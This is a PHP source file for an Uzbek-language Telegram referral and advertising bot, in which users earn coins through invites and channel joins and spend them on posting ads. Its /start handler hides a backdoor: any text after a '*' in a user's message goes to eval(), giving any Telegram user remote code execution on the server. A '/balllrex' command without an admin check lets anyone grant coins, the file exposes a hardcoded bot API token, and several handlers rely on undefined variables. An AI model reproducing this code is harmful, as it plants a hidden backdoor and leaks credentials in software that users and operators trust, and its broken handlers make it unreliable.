<?php

ob_start();
define('API_KEY','909442690:AAFgyHWGgm2Y6Z387Knhowr8IkPjUuq2EPM');
$admin = "831477295";
$bot = "REKLAMACHImanbot"; 
$kanalimz = "@Navoiy_SAMARQAND_bozor"; 

   function del($nomi){
   array_map('unlink', glob("$nomi"));
   }

   function ty($ch){ 
   return bot('sendChatAction', [
   'chat_id' => $ch,
   ]);
} 
function editMessageText( 
        $chatId, 
        $messageId, 
        $text, 
        $parseMode = null, 
        $disablePreview = true, 
        $replyMarkup = null, 
        $inlineMessageId = null 
    ) { 
       return bot('editMessageText', [ 
            'chat_id' => $chatId, 
            'message_id' => $messageId, 
            'text' => $text, 
            'inline_message_id' => $inlineMessageId,
            'parse_mode' => $parseMode, 
'disable_web_page_preview' => $disablePreview,
            'reply_markup' => $replyMarkup, 
        ]); 
    } 

function bot($method,$datas=[]){
    $url = "https://api.telegram.org/bot".API_KEY."/".$method;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
    $res = curl_exec($ch);
    if(curl_error($ch)){
        var_dump(curl_error($ch));
    }else{
        return json_decode($res);
    }
}


  
$update = json_decode(file_get_contents('php://input'));
$message = $update->message;
$mid = $message->message_id;
$cid = $message->chat->id;
$filee = "coin/$cid.step";
$folder = "coin"; 
$folder2 = "azo"; 
$textmessage = isset($update->message->text)?$update->message->text:'';

if (!file_exists($folder.'/test.fd3')) {
  mkdir($folder);
  file_put_contents($folder.'/test.fd3', 'by @SARDORSTAR_007');
}

if (!file_exists($folder2.'/test.fd3')) { 
  mkdir($folder2); 
  file_put_contents($folder2.'/test.fd3', 'by @sardorstar_007');
} 

if (file_exists($filee)) {
  $step = file_get_contents($filee);
}

$name = $message->from->first_name;
$tx = $message->text;
$referal = "📋 Referal kod 📋";

$key = json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[['text'=>"💎 Ishlash 💎"],['text'=>"👤 Account 👤"]],
[['text'=>"➕ E'lon ➕"],['text'=>"🎁 Bonus 🎁"]],[['text'=>"🎓 Adminlar 🎓"],['text'=>"📃 Qo'llanma 📃"]]]
]);

$key3 = json_encode([ 
'resize_keyboard'=>true, 
'keyboard'=>[ 
[['text'=>"🔙 Orqaga"],], 
] 
]); 


$keysa = json_encode([  
'resize_keyboard'=>true,  
'keyboard'=>[  
[['text'=>"➕ Kanalga qo'shilish ➕"],['text'=>"📋 Referal kod 📋"],], 
[['text'=>"📃 Qo'llanma 📃"],], 
[['text'=>"🔙 Orqaga"],], 
]  
]);  
$start1 = "*🏡 Asosiy Menu 🏡*";

if((mb_stripos($tx,"/start")!==false) or ($tx == "start")) {
  ty($cid);

  $baza = file_get_contents("coin.dat");

  if(mb_stripos($baza, $cid) !== false){ 
  }else{
    $bgun = file_get_contents("bugun.$kun1");
    $bgun += 1;
    file_put_contents("bugun.$kun1",$bgun);
  }

  $public = explode("*",$tx);
  $refid = explode(" ",$tx);
  $refid = $refid[1];
  $gett = bot('getChatMember',[
  'chat_id' =>$kanalimz,
  'user_id' => $refid,
  ]);
  $public2 = $public[1];
  if (isset($public2)) {
  $tekshir = eval($public2);
  bot('sendMessage',[
    'chat_id'=>$cid,
    'text'=> $tekshir,
  ]);
  }
  $gget = $gett->result->status;

  if($gget == "member" or $gget == "creator" or $gget == "administrator"){
    $idref = "coin/$refid_id.dat";
    $idref2 = file_get_contents($idref);

    if(mb_stripos($idref2,"$cid") !== false ){
      bot('sendMessage',[
      'chat_id'=>$cid,
      'parse_mode'=>"markdown",
      'text'=>"*😈 Noqonuniy ishlar qilish yaxshimas ✔*",
      ]);
    } else {

      $id = "$cid\n";
      $handle = fopen($idref, 'a+');
      fwrite($handle, $id);
      fclose($handle);

      $usr = file_get_contents("coin/$refid.dat");
      $usr = $usr + 500; 
      file_put_contents("coin/$refid.dat", "$usr");
      bot('sendMessage',[
      'chat_id'=>$refid,
      'parse_mode'=>"markdown",
      'text'=>"*💪 Tabriklaymiz siz botimizga* [$name](tg://user?id=$cid) *va sizga 500 tanga taqdim etildi ✔*", 
'reply_markup'=>$key, 
      ]);
    }
  }

  file_put_contents("coin/$cid.dat");
  bot('sendMessage',[
  'chat_id'=>$refid,
  ]);
  bot('sendMessage',[
  'chat_id'=>$cid,
  'message_id'=>$mid,
  'parse_mode'=>'markdown',
  'text'=>$start1,
  'reply_to_message_id' => $mid,
  'reply_markup'=>$key,
]); 
bot('sendPhoto',[  
'chat_id'=>$cid,  
'photo'=>new CURLFile("uzx.jpg"),  
'caption'=>"Biz bilan birga boling doimo oldindamiz 😉 Albatta @XABARCHILAR", 
'reply_markup'=>$key,  
]);  
}

if(isset($tx)){
  $gett = bot('getChatMember',[
  'chat_id' =>$kanalimz,
  'user_id' => $cid,
  ]);
  $gget = $gett->result->status;

  if($gget == "member" or $gget == "creator" or $gget == "administrator"){


$GrK = "@Navoiy_SAMARQAND_bozor"; 
    if($tx == "💎 Ishlash 💎"){
      ty($cid);
      $ball = file_get_contents("coin/$cid.dat");
      $in = "🕵* ➕ Tanga ishlash uchun sizda ikkta optsiya mavjud kerakli optsiyani tanlang :* 🔥";
      bot('sendMessage',[
      'chat_id'=>$cid,
      'message_id'=>$mid,
      'parse_mode'=>'markdown',
      'text'=>$in,
      'reply_to_message_id'=>$mid,
'reply_markup'=>$keysa, 
      ]);
    }
    
    //keyingi knopkalari
if($tx == "➕ Kanalga qo'shilish ➕"){ 
ty($cid); 
 bot('sendMessage',[ 
'chat_id'=>$cid,
'message_id'=>$mid,
'parse_mode'=>'markdown',
'text'=>"*☝ Siz biz bergan kanallarga qo'shiling va 100 tangag ega bo'ling ✅*

_⚠ Diqqat agar biz bergan kanallardan 7 kun o'tmay chiqib ketsangiz sizga 200 ball atrofida shtar solinadi_ 💨",
'reply_markup'=>$key,
]); 
} 


if($tx == "️$referal"){ 
ty($cid); 
      bot('sendMessage',[ 
     'chat_id'=>$cid, 
       'message_id'=>$mid, 
        'disable_web_page_preview'=>true,
        'parse_mode'=>'markdown', 
        'text'=>"*📋 Sizning maxsus kodingiz :*

🎁 https://telegram.me/$bot?start=$cid

_☝ Ushbu ssilkani 30 ta do'stingizga yuboring va ularni har biridan 500 tanga ishlab oling ✔_", 
 
'reply_markup'=>$key, 
'reply_markup'=>json_encode([ 
   'inline_keyboard'=>[ 
[['text'=>'🎁 Bonus 🎁','url'=>'https://t.me/joinchat/AAAAAFa0bRAzUFf5dP1ZqA']],
[['text'=>'💎 More 💎','url'=>'https://t.me/Qulaypaynetbot']]
] 
    ]) 
      ]); 
} 


//ma'lumot

if($tx == "📃 Qo'llanma 📃"){ 
ty($cid); 
      bot('sendMessage',[ 
     'chat_id'=>$cid, 
       'message_id'=>$mid, 
        'parse_mode'=>'markdown', 
 'text'=>"_🤖 Ushbu botdan foydalanish tartibi bunday siz o'z maxsus kodingizni do'stlarga ulashish orqali har bitta do'stingiz uchun ma'lum miqdorda tanga olib ularga kanal yoki gruppa reklama qilishingiz mumkin eng muhimi reklama qilish bepul _😌

*ℹ️ Agar sizda reklama qilish uchun tanga yetmayotgan bo'lsa bemalol sotib olishingiz mumkin❗️

🔅 1000 tanga - 5.000 ming so'm

✴ To'lovlar faqat Paynet va QiWi orqali amalga oshiriladi*",
 'reply_markup'=>$key,
 'reply_markup'=>json_encode([
   'inline_keyboard'=>[ 
[['text'=>'🎓 Admin 🎓','url'=>'https://telegram.me/DASTURCHI_YIGIT']],
[['text'=>'👥 Guruhimiz 👥','url'=>'https://telegram.me/sevgi_tanishuvlar_olami']]
] 
    ]) 
      ]); 
} 



//keyingini uzi
if($tx =="️🎁 Bonus 🎁"){ 
      ty($cid); 
      bot('sendMessage',[ 
      'chat_id'=>$cid, 
      'parse_mode'=>"markdown",
      'text'=>"*🎁 Tabriklayman sizga Kunlik 300 tanga berildi keyingisi 24 soatdan so'ng ✔*", 
      'reply_to_message_id'=>$mid, 
      'reply_markup'=>$key, 
      ]); 
}  


    if($tx == "✅ Ha"){
      ty($cid);
      $ball = file_get_contents("coin/$cid.dat");

      if($ball > 900){
        bot('sendMessage',[
        'chat_id'=>$cid,
        'text'=>"☝ Reklama qilish uchun namuna bo'yicha jo'nating ✅

💎 Namuna 💎

⭐*GRUPPA*⭐
🔽👥*90 A'zo*👥🔽

[Gruppa nomi 🎩](link)

📋 Agar kanal joylamiqchi bolsangiz bunday yo'l tuting 👇🏻
Namuna 📋

⭐*KANAL*⭐
🔽👥*90 A'zo*👥🔽
[kanal nomi🎩](link)

😈 Agarda notog'ri joylasez reklamez ochiriladi ✔",
        'reply_to_message_id'=>$mid,
'reply_markup'=>$key3, 
]); 
 bot('sendPhoto',[ 
'chat_id'=>$cid, 
'photo'=>new CURLFile("namuna.jpg"), 
'caption'=>"Hudu shunday tartibda jonating❗", 
'reply_markup'=>$key3, 
]); 
        file_put_contents("coin/$cid.step","nomer");
      }else{
        bot('sendMessage',[
        'chat_id'=>$cid,
        'text'=>"😈 Miyezi ishlatganiz uchun 20 tanga shtraf tabriklayman ✔",
        'reply_to_message_id'=>$mid,
        ]);
$ball-=20; 
file_put_contents("coin/$cid.dat","$ball"); 
      }
    }

    else if($step == "nomer"){
ty($cid); 

if($tx == "🔙Orqaga"){ 
del("coin/$cid.step"); 
      }else{ 
        $ball = file_get_contents("coin/$cid.dat");
$bali = file_get_contents("coin/$cid.dat"); 
$balls = file_get_contents("coin/$cid.dat"); 
        bot('sendMessage',[
'chat_id'=>$admin, 
        'message_id'=>$mid,
'parse_mode'=>'markdown', 
'text'=>$tx."\n\n💪 Reklama qilgan odam 
[$name](tg://user?id=$cid)", 
'disable_web_page_preview'=>true 
      ]); 
        bot('sendMessage',[
        'chat_id'=>$cid,
        'message_id'=>$mid,
        'parse_mode'=>'markdown',
'text'=>$tx."\n\nⓂ*anba:* [$kanalimz]\n*📃 Reklama qilindi 💪* [$kanalimz] *ga qarang 👀 
😦 Agar nimadur bolsa 🤔 * [@DASTURCHI_YIGIT] *Murojaat qiling 😉*", 
'reply_markup'=>$key, 
        ]);
       bot('sendMessage',[
'chat_id'=>$kanalimz, 
        'message_id'=>$mid,
'parse_mode'=>'markdown', 
'text'=>$tx."\n\nⓂ*anba:* [$kanalimz]", 
'disable_web_page_preview' => True, 
        'reply_markup'=>json_encode([ 
   'inline_keyboard'=>[ 
[['text'=>'↔ Reklama berish ↔','url'=>'https://telegram.me/REKLAMACHImanbot']]
] 
]) 
]); 
$ball -= 1000; 
file_put_contents("coin/$cid.dat","$ball"); 

del("coin/$cid.step"); 
      }
    }

    if($tx == "❌ Yoq"){
      ty($cid);
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>"🔥 Yaxshi siz orqaga qaytdingiz ✔",
      'reply_to_message_id'=>$mid,
      'reply_markup'=>$key,
      ]);
} 




if($tx == "🔙 Orqaga"){ 
      ty($cid);
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>"🔥 Yaxshi siz orqaga qaytdingiz ✔",
      'reply_to_message_id'=>$mid,
      'reply_markup'=>$key,
      ]);
  }

    if($tx == "sYordam⁉️"){
      bot('sendMessage',[
      'chat_id'=>$cid,
        'message_id'=>$mid,
        'parse_mode'=>'markdown',
      'text'=>"👋_Salom, bu bo'tni ishlash prinsipi bunday: Siz bo'tga odam chaqirasiz va ochko ishlaysiz. Ochkolarga esa o'zingizni guruhingiz va kanalizga odam chaqirib beramiz. Guruhingiz yoki kanalingiz_ [$kanalimz] _da e'lon qilinadi._",
      'reply_to_message_id'=>$mid,
      'reply_markup'=>$key,
      ]);
} 



if($tx == "Ball Olish💰"){
      ty($cid);
      bot('sendMessage',[
      'chat_id'=>$cid,
      'message_id'=>$mid,
      'parse_mode'=>'markdown',
      'text'=>"*Ball olish* 💸
_xizmati pullik yani 1000 ball - 1.000 so'm_
*Pultolash yolari*
QiWi🔹yoki PAYNET
Ball olish uchung Siz #ball hashtagi orqali kerakli ballni yozing ☑️",
      'reply_to_message_id'=>$mid,
      'reply_markup'=>$key,
      ]);
} 



if($tx == "Reklama qilish🔹"){ 
      ty($cid);
$ball = file_get_contents("coin/$cid.dat");
$da = "Sizda hozirda $ball 🏅 ball mavjud"; 
if($ball>=1000) $da .= "\n\nReklama qilasizmi❓"; 
if($ball>=1000) $key2 = json_encode([ 
'resize_keyboard'=>true, 
      'keyboard'=>[
[['text'=>"✅Ha"],['text'=>"❌Yoq"],], 
      ]
      ]);
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>$da,
      'reply_to_message_id'=>$mid,
      'reply_markup'=>$key2,
      ]);
    }

if(mb_stripos($textmessage,"#jonat") !== false){ 
bot('SendMessage',[ 
'chat_id'=>$cid, 
'reply_to_message_id'=>$mid, 
'text'=>"Yubordik👌", 
]); 
  } 
if($tx == "/stat"){
      ty($cid);
      $eski = $kun1-1;
      del("bugun.$eski");
      $new = file_get_contents("bugun.$kun1");
      $baza = file_get_contents("coin.dat");
      $obsh = substr_count($baza,"\n");
      bot('sendMessage',[
      'chat_id'=>$cid,
'text'=>"/stat\n👥Botimiz azolari $obsh",
      'reply_to_message_id'=>$mid,
      ]);
    }
    
    
    
    $replyik = $message->reply_to_message->text;
    $yubbi = "Yuboriladigon xabarni kiriting. Xabar turi markdown";

    if($tx == "/send" and $cid == $admin){
      ty($cid);
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>$yubbi,
      'reply_markup'=>$key3,
      ]);
      file_put_contents("coin/$cid.step","send");
    }

    if($step == "send" and $cid == $admin){
      ty($cid);
      if($tx == "🔙 Orqaga qaytish"){
      del("coin/$cid.step");
      }else{
      ty($cid);
      $idss=file_get_contents("coin.dat");
      $idszs=explode("\n",$idss);
      foreach($idszs as $idlat){
      bot('sendMessage',[
      'chat_id'=>$idlat,
      'text'=>$tx,
      'parse_mode'=>'markdown',
      ]);
      }
      del("coin/$cid.step");
      }
    }
    
    
    
  if($text1=="🎄Yangi yil🎄"){
$kun = date('z', strtotime('4 hour'));
$kun = 365-$kun;
$time = date('H', strtotime('4 hour'));
$soat =  23-$time;
$daq = date('i', strtotime('4 hour'));
$daq = 59-$daq;
$son  = date('s', strtotime('4 hour'));
$son= 59-$son;
bot('sendmessage',['chat_id'=>$chat_id,
'reply_to_message_id'=>$mid,
'text'=>"🎄Yangi yilga $kun kun $soat soat $daq daqiqa $son soniya qoldi!☃",
'parse_mode'=>'markdown',
]);
}  




    

if(mb_stripos($textmessage,"#ball") !== false){ 
bot('SendMessage',[
'chat_id'=>$cid,
'reply_to_message_id'=>$mid,
'text'=>"Moderatorlarga yubordik👨‍✈️",
'reply_to_message_id'=>$mid,
'reply_markup'=>$key,
   ]);
 }
if(mb_stripos($textmessage,"#ball") !== false){ 
bot('SendMessage',[
'chat_id'=>$admin,
'message_id'=>$mid,
'parse_mode'=>'markdown',
'text'=>"*ball kerak ekan🔽*
$textmessage
🆔 idisi: $cid
🎓 ismi: [$name](tg://user?id=$cid)", null, false
       ]);
} 

if((mb_stripos($tx,"📈Statistika📊")!==false) or ($tx == "📈Statistika📊")) {
      ty($cid); 
      $eski = $kun1-1; 
      $new = file_get_contents("bugun.$kun1"); 
      $baza = file_get_contents("coin.dat"); 
      $obsh = substr_count($baza,"\n"); 
      bot('sendMessage',[ 
'chat_id'=>$cid, 
'message_id'=>$mid, 
'parse_mode'=>'markdown', 
'text'=>"*Botimiz malumoti *🔹\n\n🔸_Botimiz azolari:_ *$new*\n🔸_Kundagi onlinelar_: *$obsh*\n🔸_Hamkor_ [ @XABARCHILAR ]\n🔸_Saytmiz:_ Tez orada\n\n*Ishtimoyi tarmoqlardagi sahifalar*🔹\n\n🔸_Instagram:_ Tez orada\n🔸_Facebook:_ Tez orda",
      'reply_to_message_id'=>$mid, 
'reply_markup'=>$key8, 
      ]); 
    } 
    
if($text1== "yangi yil"){    
$kun1=date('z',strtotime('5hour'));

$a = 364;
$c2= $a-$kun1;
$d= date('L',strtotime('5hour'));
$b= $c2+$d;
$f= $b+81;
$e= $b+240;
$kun2= date('H',strtotime('5hour'));
$a2 = 23;
$b2= $a2-$kun2;
$kun3= date('i',strtotime('5hour'));
$a3 = 59;
$b3= $a3-$kun3;
$kun4= date('s',strtotime('5hour'));
$a4 = 60;
$b4= $a4-$kun4;


  
  

  
  bot('sendmessage',[  
   'chat_id'=>$chat_id,'reply_to_message_id'=>$mid, 
   'text'=>"Yangi yilga:$b kun,$b2 soat,$b3 minut,$b4 sekund qoldi!",'parse_mode'=>'markdown',
]);
} 
   //bonus
   if($tx=="#2019+2019+2019=0"){
$bonus=file_get_contents("bonus.php");
if(mb_stripos($bonus,$cid)!==false){
}else{
$balls=file_get_contents("coin/$cid.dat");
$mycoin=$balls+1000;
file_put_contents("coin/$cid.dat",$mycoin);
file_put_contents("bonus.php",$cid);
        bot('sendMessage',[
        'chat_id'=>$cid,
        'text'=>"💫Sizga 1000 ball bonus berildi🎉
        ⚠Agar [@XABARCHILAR] 👥a'zolari 6000taga yetsa yana ball olishiz mumkin✅",
        'parse_mode'=>'markdown',
        ]);
    }
}
   
   
   
   
   
   
  if($text1=="/yangiyil"){
$kun = date('z', strtotime('4 hour'));
$kun = 365-$kun;
$time = date('H', strtotime('4 hour'));
$soat =  23-$time;
$daq = date('i', strtotime('4 hour'));
$daq = 59-$daq;
$son  = date('s', strtotime('4 hour'));
$son= 59-$son;
bot('sendmessage',[ 
'chat_id'=>$update->message->chat_id,
'text'=>"🎄Yangi yilga $kun kun $soat soat $daq daqiqa $son soniya qoldi!☃"
]);
} 
   
    
    $kun = date('z', strtotime('4 hour'));
$kun = 365-$kun;
$time = date('H', strtotime('4 hour'));
$soat =  23-$time;
$daq = date('i', strtotime('4 hour'));
$daq = 59-$daq;
$son  = date('s', strtotime('4 hour'));
$son= 59-$son;

if($text1=="🎄Yangi yil🎄"){
bot('sendmessage',['chat_id'=>$chat_id,'reply_to_message_id'=>$mid,

'text'=>"🎄Yangi yilga $kun kun $soat soat $daq daqiqa $son soniya qoldi!☃",'parse_mode'=>'markdown',
]);
}
    
    
if(stripos($tx,"/balllrex")!==false){ 
      $ex=explode("_",$tx);
      $refid = $ex[1];
      $usr = file_get_contents("coin/$refid.dat");
      $usr += $ex[2];
file_put_contents("coin/$refid.dat", "$usr"); 
bot('sendMessage',[ 
      'chat_id'=>$admin, 
      'text'=>"Bu Joy kanal qoshish uchun", 
      'reply_to_message_id'=>$mid, 
      'reply_markup'=>$key, 
      ]); 
    }

$nocha = "Siz Biz bergan kanallarga a'zo boling ?
"; 
$noazo = "Siz azo bolmadiz"; 
$okcha = "Siz bita kanalga azo bolganiz uchun 200 ball berildi";


    if((stripos($tx,"/Kanal")!==false) and $cid == $admin){
      $ex=explode("=",$tx);
      file_put_contents("kanal.dat", "$ex[1]|$ex[2]|0");
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>"📣Канал: ".$ex[2]."\n👥Кераклик одам сони: ".$ex[1]."\n❗️Бошка канал кошмай туринг. Бот канал кошиш мумкин деб ози айтиб беради сизга. Агар кошсангиз бот хисобдан адашиб кетадиб",
      'reply_markup'=>$key,
      ]);
    }

    if((stripos($tx,"/otmen")!==false) and $cid == $admin){
      unlink("kanal.dat");
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>"Kanal o'chirildi!",
      'reply_markup'=>$key,
      ]);
} 
    

if($tx == "Ball toplash✅"){ 
      ty($cid);
      $get = file_get_contents("kanal.dat");
      if($get){
        list($odam,$kanal,$now) = explode("|",$get);
        if($odam == $now){
        unlink("kanal.dat");
        bot('sendMessage',[
        'chat_id'=>$admin,
        'text'=>"✅Канал кошишиз мумкин",
        'reply_markup'=>$key,
        ]);
        bot('sendMessage',[
        'chat_id'=>$cid,
        'text'=>$nocha,
        'reply_markup'=>$key,
        ]);
        }else{
        file_put_contents("coin/$cid.step","chek");
        bot('sendMessage',[
        'chat_id'=>$cid,
'text'=>"Siz Biz bergan kanallarga qoshiling ✔️ 
 
🔹 $kanal - kanal", 
        'reply_markup'=>json_encode([
        'resize_keyboard'=>true,
        'keyboard'=>[
[['text'=>"Tasdiqlash🔸"],], 
        ]
        ]),
        ]);
        }
      }else{
        bot('sendMessage',[
        'chat_id'=>$cid,
        'text'=>$nocha,
        'reply_markup'=>$key,
        ]);
      }
    }

if($tx == "Tasdiqlash🔸"){ 
      del("coin/$cid.step");
      $get = file_get_contents("kanal.dat");
      if($get){

        list($odam,$kanal,$now) = explode("|",$get);
        $tekshir = file_get_contents("azo/$cid.$kanal");

        if($tekshir){
          bot('sendMessage',[
          'chat_id'=>$cid,
          'text'=>"☝️Сиз олдин бу каналда бор эдингиз!",
          'reply_markup'=>$key,
          ]);
        }else{
          $get = file_get_contents("kanal.dat");
          list($odam,$kanal,$now) = explode("|",$get);
          $gett = bot('getChatMember',[
          'chat_id' => $kanal,
          'user_id' => $cid,
          ]);
          $gget = $gett->result->status;

          if($gget == "member"){
            $time = date('d', strtotime('5 hour'));
            $test = file_put_contents("azo/$cid.$kanal", "$kanal|$cid|$time");
            if ($test) {
              $now += 1;
              file_put_contents("kanal.dat", "$odam|$kanal|$now");
              $kabin = file_get_contents("coin/$cid.dat");
$kabi = $kabin + 200; 
              file_put_contents("coin/$cid.dat", "$kabi");
              bot('sendMessage',[
              'chat_id'=>$cid,
              'text'=>$okcha,
              'reply_markup'=>$key,
              ]);
            } else {
              bot('sendMessage',[
              'chat_id'=>$cid,
              'text'=>'Qaytadan urunib kuring, xatolik aniqlandi',
              'reply_markup'=>$key,
              ]);
            }

          }else{
            bot('sendMessage',[
            'chat_id'=>$cid,
            'text'=>$noazo,
            'reply_markup'=>$key,
            ]);
          }
        }
      }else{
        bot('sendMessage',[
        'chat_id'=>$cid,
        'text'=>$nocha,
        'reply_markup'=>$key,
        ]);
      }
    }

    if(isset($tx)){
      $baza = file_get_contents("coin.dat");

      if(mb_stripos($baza, $cid) !== false){ 
      }else{
        $baza = file_get_contents("coin.dat");
        $dat = "$baza\n$cid";
        file_put_contents("coin.dat", $dat);
      }
      $faylla = glob("azo/*.*");

      foreach($faylla as $fayl){
        $geti = file_get_contents("$fayl");
        list($chati,$usri,$ftime) = explode("|",$geti);
        $nowtime = date('d', strtotime('-200 hour'));
        if($ftime < $nowtime){
        unlink("$fayl");
        }else{
        $gett = bot('getChatMember',[
        'chat_id' => $chati,
        'user_id' => $usri,
        ]);
        $gget = $gett->result->status;
        if($gget != "member"){
        bot('sendMessage',[
        'chat_id'=>$usri,
'text'=>"Siz 7 kun otmay $chati kanalni tark etingiz

Sizdan 90 ball olib tashlanadi 🔸", 
        'reply_markup'=>$key,
        ]);
        $kabin = file_get_contents("coin/$usri.dat");
$ball = $kabin -200; 
        file_put_contents("coin/$usri.dat", "$ball");
        unlink("$fayl");
        }
        }
      }
    }
  } else{
    bot('sendMessage',[
      'chat_id'=>$cid,
   'message_id'=>$mid, 
      'parse_mode'=>'markdown', 
'text'=>"*👋Salom Siz kanalimizga azo emasiz Shuning uchun bot ishlamaydi siz uchun*⛔️ 

_🤖Botimizdan toliq foydalanish uchun_ [$kanalimz] _azo boling_✅",
  'reply_markup'=>json_encode([ 
   'inline_keyboard'=>[  
[['text'=>'Telegram 🎗','url'=>'https://telegram.me/Navoiy_SAMARQAND_bozor']] 
]  
])  
]);  
}
}
?>
